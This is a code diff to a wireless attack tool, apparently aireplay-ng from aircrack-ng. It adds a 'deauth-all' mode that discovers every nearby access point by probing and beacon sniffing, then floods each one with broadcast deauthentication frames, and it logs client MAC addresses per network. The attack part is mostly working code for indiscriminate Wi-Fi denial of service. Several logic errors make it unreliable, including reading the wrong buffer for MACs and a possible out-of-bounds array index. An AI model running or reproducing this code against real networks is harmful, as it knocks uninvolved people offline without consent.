@@ -76,7 +76,7 @@
 #define RTC_RESOLUTION  8192
 
 #define REQUESTS    30
-#define MAX_APS     50
+#define MAX_APS     128
 
 #define NEW_IV  1
 #define RETRY   2
@@ -314,6 +314,11 @@ struct ARP_req
     int len;
 };
 
+struct AP_client {
+    unsigned char mac[6];
+    struct AP_client* next;
+};
+
 struct APt
 {
     unsigned char set;
@@ -324,6 +329,8 @@ struct APt
     unsigned char chan;
     unsigned int  ping[REQUESTS];
     int  pwr[REQUESTS];
+    unsigned int num_clients;
+    struct AP_client* clients;
 };
 
 struct APt ap[MAX_APS];
@@ -1318,6 +1325,219 @@ void send_fragments(unsigned char *packet, int packet_len, unsigned char *iv, un
 
 }
 
+int add_client_to_ap(struct APt *ap, unsigned char mac[6]) {
+    struct AP_client* client_cur = ap->clients;
+    struct AP_client* client_new = NULL;
+
+    // Ignore broadcast
+    if (    mac[0] == 0xFF &&
+            mac[1] == 0xFF &&
+            mac[2] == 0xFF &&
+            mac[3] == 0xFF &&
+            mac[4] == 0xFF &&
+            mac[5] == 0xFF)
+        return 0;
+
+    if (ap->clients == NULL) {
+      client_new = calloc(1, sizeof(struct AP_client));
+      memcpy(client_new->mac, mac, 6);
+      ap->clients = client_new;
+      ap->num_clients++;
+      return 1;
+    }
+
+    while (client_cur != NULL && client_cur->next != NULL) {
+        client_cur = client_cur->next;
+        if(memcmp(client_cur->mac, mac, 6) == 0)
+            return 0; // already have it
+    }
+
+    client_new = calloc(1, sizeof(struct AP_client));
+    memcpy(client_new->mac, mac, 6);
+    client_cur->next = client_new;
+    ap->num_clients++;
+
+    return 1;
+}
+
+int grab_essid(unsigned char* packet, int len)
+{
+    int i=0, j=0, pos=0, tagtype=0, taglen=0, chan=0;
+    unsigned char bssid[6];
+
+    memcpy(bssid, packet+16, 6);
+    taglen = 22;    //initial value to get the fixed tags parsing started
+    taglen+= 12;    //skip fixed tags in frames
+    do
+    {
+        pos    += taglen + 2;
+        tagtype = packet[pos];
+        taglen  = packet[pos+1];
+    } while(tagtype != 3 && pos < len-2);
+
+    if(tagtype != 3) return -1;
+    if(taglen != 1) return -1;
+    if(pos+2+taglen > len) return -1;
+
+    chan = packet[pos+2];
+
+    pos=0;
+
+    taglen = 22;    //initial value to get the fixed tags parsing started
+    taglen+= 12;    //skip fixed tags in frames
+    do
+    {
+        pos    += taglen + 2;
+        tagtype = packet[pos];
+        taglen  = packet[pos+1];
+    } while(tagtype != 0 && pos < len-2);
+
+    if(tagtype != 0) return -1;
+    if(taglen > 250) taglen = 250;
+    if(pos+2+taglen > len) return -1;
+
+    // dest / source macs - ap mac
+    unsigned char dst_mac[6];
+    unsigned char src_mac[6];
+    memcpy( &src_mac, h80211 + 10, 6 );
+    memcpy( &dst_mac, h80211 + 16, 6 );
+
+    for(i=0; i<MAX_APS; i++)
+    {
+        if( ap[i].set)
+        {
+            if( memcmp(bssid, ap[i].bssid, 6) == 0 )    //got it already
+            {
+                if(packet[0] == 0x50 && !ap[i].found)
+                {
+                    ap[i].found++;
+                }
+                if(ap[i].chan == 0) ap[i].chan=chan;
+                return -1;
+            }
+        }
+        else // (ap[i].set == 0)
+        {
+            for(j=0; j<taglen; j++)
+            {
+                if(packet[pos+2+j] < 32 || packet[pos+2+j] > 127)
+                {
+                    return -1;
+                }
+            }
+
+            ap[i].set = 1;
+            ap[i].len = taglen;
+            memcpy(ap[i].essid, packet+pos+2, taglen);
+            ap[i].essid[taglen] = '\0';
+            memcpy(ap[i].bssid, bssid, 6);
+            ap[i].chan = chan;
+            if(packet[0] == 0x50) ap[i].found++;
+            break;
+        }
+    }
+
+    if(packet[0] == 0x50) // data packet
+    {
+
+        if(add_client_to_ap(&ap[i], dst_mac)) {
+            PCT; printf( "Detected client [%02X:%02X:%02X:%02X:%02X:%02X] for AP -- BSSID:"
+                    " [%02X:%02X:%02X:%02X:%02X:%02X]\n",
+                    dst_mac[0], dst_mac[1],
+                    dst_mac[2], dst_mac[3],
+                    dst_mac[4], dst_mac[5],
+                    ap[i].bssid[0], ap[i].bssid[1],
+                    ap[i].bssid[2], ap[i].bssid[3],
+                    ap[i].bssid[4], ap[i].bssid[5] );
+        }
+
+        if(add_client_to_ap(&ap[i], src_mac)) {
+            PCT; printf( "Detected client [%02X:%02X:%02X:%02X:%02X:%02X] for AP -- BSSID:"
+                    " [%02X:%02X:%02X:%02X:%02X:%02X]\n",
+                    src_mac[0], src_mac[1],
+                    src_mac[2], src_mac[3],
+                    src_mac[4], src_mac[5],
+                    ap[i].bssid[0], ap[i].bssid[1],
+                    ap[i].bssid[2], ap[i].bssid[3],
+                    ap[i].bssid[4], ap[i].bssid[5] );
+        }
+    }
+    return 0;
+}
+
+//time in ms to wait for answer packet (needs to be higher for airserv)
+int probe_networks(unsigned long atime) {
+    struct rx_info ri;
+    unsigned char packet[4096];
+    struct timeval tv, tv2;
+    memcpy(h80211, PROBE_REQ, 24);
+
+    int len = 24;
+
+    h80211[24] = 0x00;      //ESSID Tag Number
+    h80211[25] = 0x00;      //ESSID Tag Length
+
+    len += 2;
+
+    memcpy(h80211+len, RATES, 16);
+
+    len += 16;
+
+    memset(ap, '\0', sizeof(ap));
+    int found = 0;
+    for(int i=0; i<3; i++)
+    {
+        /*
+            random source so we can identify our packets
+        */
+        opt.r_smac[0] = 0x00;
+        opt.r_smac[1] = rand() & 0xFF;
+        opt.r_smac[2] = rand() & 0xFF;
+        opt.r_smac[3] = rand() & 0xFF;
+        opt.r_smac[4] = rand() & 0xFF;
+        opt.r_smac[5] = rand() & 0xFF;
+
+        memcpy(h80211+10, opt.r_smac, 6);
+
+        send_packet(h80211, len);
+
+        gettimeofday( &tv, NULL );
+
+        while (1)  //waiting for relayed packet
+        {
+            int caplen = read_packet(packet, sizeof(packet), &ri);
+
+            if (packet[0] == 0x50 ) //Is probe response
+            {
+                if (! memcmp(opt.r_smac, packet+4, 6)) //To our MAC
+                {
+                    if(grab_essid(packet, caplen) == 0 && (!memcmp(opt.r_bssid, NULL_MAC, 6)))
+                    {
+                        found++;
+                    }
+                }
+            }
+
+            if (packet[0] == 0x80 ) //Is beacon frame
+            {
+                if(grab_essid(packet, caplen) == 0 && (!memcmp(opt.r_bssid, NULL_MAC, 6)))
+                {
+                    found++;
+                }
+            }
+
+            gettimeofday( &tv2, NULL );
+            if (((tv2.tv_sec*1000000UL - tv.tv_sec*1000000UL) + (tv2.tv_usec - tv.tv_usec)) > (3*atime*1000)) //wait 'atime'ms for an answer
+            {
+                break;
+            }
+        }
+    }
+    return found;
+}
+
+
+
 int do_attack_deauth( void )
 {
     int i, n;
@@ -1349,7 +1569,7 @@ int do_attack_deauth( void )
             memcpy( h80211 + 16, opt.r_bssid, 6 );
 
             /* add the deauth reason code */
-	    h80211[24] = opt.deauth_rc;
+            h80211[24] = opt.deauth_rc;
 
             aacks = 0;
             sacks = 0;
@@ -1438,7 +1658,7 @@ int do_attack_deauth( void )
                          opt.r_bssid[4], opt.r_bssid[5] );
 
             memcpy( h80211, DEAUTH_REQ, 26 );
-	    h80211[24] = opt.deauth_rc;
+            h80211[24] = opt.deauth_rc;
 
             memcpy( h80211 +  4, BROADCAST,   6 );
             memcpy( h80211 + 10, opt.r_bssid, 6 );
@@ -1455,6 +1675,42 @@ int do_attack_deauth( void )
     }
 
     return( 0 );
+}
+
+int do_attack_deauth_all( void )
+{
+    int found = probe_networks(800);
+    PCT; printf("Found %d AP%c\n", found, ((found == 1) ? ' ' : 's' ) );
+
+    for( int i = 0; i < found; i++) {
+        PCT; printf("%02X:%02X:%02X:%02X:%02X:%02X - channel: %d - \'%s\'\n", ap[i].bssid[0], ap[i].bssid[1],
+                    ap[i].bssid[2], ap[i].bssid[3], ap[i].bssid[4], ap[i].bssid[5], ap[i].chan, ap[i].essid);
+        memcpy( h80211, DEAUTH_REQ, 26 );
+        memcpy( h80211 + 16, ap[i].bssid, 6 );
+        h80211[24] = opt.deauth_rc;
+
+        memcpy( h80211 +  4, BROADCAST,   6 );
+        memcpy( h80211 + 10, ap[i].bssid, 6 );
+        memcpy( h80211 + 16, ap[i].bssid, 6 );
+
+        for( int j = 0; j < opt.a_count; j++)
+        {
+            PCT; printf( "Sending DeAuth (code %i) to broadcast -- BSSID:"
+                    " [%02X:%02X:%02X:%02X:%02X:%02X]\n",
+                    opt.deauth_rc,
+                    ap[i].bssid[0], ap[i].bssid[1],
+                    ap[i].bssid[2], ap[i].bssid[3],
+                    ap[i].bssid[4], ap[i].bssid[5] );
+            for( int k = 0; k < 128; k++ )
+            {
+                if( send_packet( h80211, 26 ) < 0 )
+                    break;
+
+                usleep( 2000 );
+            }
+        }
+    }
+    return 0;
 }
 
 int do_attack_fake_auth( void )
@@ -5336,79 +5592,6 @@ int do_attack_fragment()
     return( 0 );
 }
 
-int grab_essid(unsigned char* packet, int len)
-{
-    int i=0, j=0, pos=0, tagtype=0, taglen=0, chan=0;
-    unsigned char bssid[6];
-
-    memcpy(bssid, packet+16, 6);
-    taglen = 22;    //initial value to get the fixed tags parsing started
-    taglen+= 12;    //skip fixed tags in frames
-    do
-    {
-        pos    += taglen + 2;
-        tagtype = packet[pos];
-        taglen  = packet[pos+1];
-    } while(tagtype != 3 && pos < len-2);
-
-    if(tagtype != 3) return -1;
-    if(taglen != 1) return -1;
-    if(pos+2+taglen > len) return -1;
-
-    chan = packet[pos+2];
-
-    pos=0;
-
-    taglen = 22;    //initial value to get the fixed tags parsing started
-    taglen+= 12;    //skip fixed tags in frames
-    do
-    {
-        pos    += taglen + 2;
-        tagtype = packet[pos];
-        taglen  = packet[pos+1];
-    } while(tagtype != 0 && pos < len-2);
-
-    if(tagtype != 0) return -1;
-    if(taglen > 250) taglen = 250;
-    if(pos+2+taglen > len) return -1;
-
-    for(i=0; i<MAX_APS; i++)
-    {
-        if( ap[i].set)
-        {
-            if( memcmp(bssid, ap[i].bssid, 6) == 0 )    //got it already
-            {
-                if(packet[0] == 0x50 && !ap[i].found)
-                {
-                    ap[i].found++;
-                }
-                if(ap[i].chan == 0) ap[i].chan=chan;
-                break;
-            }
-        }
-        if(ap[i].set == 0)
-        {
-            for(j=0; j<taglen; j++)
-            {
-                if(packet[pos+2+j] < 32 || packet[pos+2+j] > 127)
-                {
-                    return -1;
-                }
-            }
-
-            ap[i].set = 1;
-            ap[i].len = taglen;
-            memcpy(ap[i].essid, packet+pos+2, taglen);
-            ap[i].essid[taglen] = '\0';
-            memcpy(ap[i].bssid, bssid, 6);
-            ap[i].chan = chan;
-            if(packet[0] == 0x50) ap[i].found++;
-            return 0;
-        }
-    }
-    return -1;
-}
-
 static int get_ip_port(char *iface, char *ip, const int ip_size)
 {
 	char *host;
@@ -5767,8 +5950,6 @@ int do_attack_test()
 
     srand( time( NULL ) );
 
-    memset(ap, '\0', sizeof(ap));
-
     essidlen = strlen(opt.r_essid);
     if( essidlen > 250) essidlen = 250;
 
@@ -5787,81 +5968,7 @@ int do_attack_test()
         set_bitrate(_wi_out, RATE_1M);
 
     PCT; printf("Trying broadcast probe requests...\n");
-
-    memcpy(h80211, PROBE_REQ, 24);
-
-    len = 24;
-
-    h80211[24] = 0x00;      //ESSID Tag Number
-    h80211[25] = 0x00;      //ESSID Tag Length
-
-    len += 2;
-
-    memcpy(h80211+len, RATES, 16);
-
-    len += 16;
-
-    gotit=0;
-    answers=0;
-    for(i=0; i<3; i++)
-    {
-        /*
-            random source so we can identify our packets
-        */
-        opt.r_smac[0] = 0x00;
-        opt.r_smac[1] = rand() & 0xFF;
-        opt.r_smac[2] = rand() & 0xFF;
-        opt.r_smac[3] = rand() & 0xFF;
-        opt.r_smac[4] = rand() & 0xFF;
-        opt.r_smac[5] = rand() & 0xFF;
-
-        memcpy(h80211+10, opt.r_smac, 6);
-
-        send_packet(h80211, len);
-
-        gettimeofday( &tv, NULL );
-
-        while (1)  //waiting for relayed packet
-        {
-            caplen = read_packet(packet, sizeof(packet), &ri);
-
-            if (packet[0] == 0x50 ) //Is probe response
-            {
-                if (! memcmp(opt.r_smac, packet+4, 6)) //To our MAC
-                {
-                    if(grab_essid(packet, caplen) == 0 && (!memcmp(opt.r_bssid, NULL_MAC, 6)))
-                    {
-                        found++;
-                    }
-                    if(!answers)
-                    {
-                        PCT; printf("Injection is working!\n");
-                        if(opt.fast) return 0;
-                        gotit=1;
-                        answers++;
-                    }
-                }
-            }
-
-            if (packet[0] == 0x80 ) //Is beacon frame
-            {
-                if(grab_essid(packet, caplen) == 0 && (!memcmp(opt.r_bssid, NULL_MAC, 6)))
-                {
-                    found++;
-                }
-            }
-
-            gettimeofday( &tv2, NULL );
-            if (((tv2.tv_sec*1000000UL - tv.tv_sec*1000000UL) + (tv2.tv_usec - tv.tv_usec)) > (3*atime*1000)) //wait 'atime'ms for an answer
-            {
-                break;
-            }
-        }
-    }
-    if(answers == 0)
-    {
-        PCT; printf("No Answer...\n");
-    }
+    found = probe_networks(atime);
 
     PCT; printf("Found %d AP%c\n", found, ((found == 1) ? ' ' : 's' ) );
 
@@ -6510,6 +6617,7 @@ int main( int argc, char *argv[] )
 
         static struct option long_options[] = {
             {"deauth",      1, 0, '0'},
+            {"deauth-all",  1, 0,  2 },
             {"fakeauth",    1, 0, '1'},
             {"interactive", 0, 0, '2'},
             {"arpreplay",   0, 0, '3'},
@@ -6523,7 +6631,7 @@ int main( int argc, char *argv[] )
             {"bittest",     0, 0, 'B'},
             {"migmode",     0, 0, '8'},
             {"ignore-negative-one", 0, &opt.ignore_negative_one, 1},
-	    {"deauth-rc",   1, 0, 'Z'},
+            {"deauth-rc",   1, 0, 'Z'},
             {0,             0, 0,  0 }
         };
 
@@ -6537,6 +6645,16 @@ int main( int argc, char *argv[] )
         {
             case 0 :
 
+                break;
+            case 2:
+                opt.a_mode = 11;
+                opt.a_count = atoi(optarg);
+                if( opt.a_count < 0 )
+                {
+                    printf( "Invalid deauthentication count or missing value. [>=0]\n" );
+                    printf("\"%s --help\" for help.\n", argv[0]);
+                    return( 1 );
+                }
                 break;
 
             case ':' :
@@ -7215,6 +7333,7 @@ usage:
         case 7 : return( do_attack_cfrag()       );
         case 8 : return( do_attack_migmode()     );
         case 9 : return( do_attack_test()        );
+        case 11 : return( do_attack_deauth_all() );
         default: break;
     }
 
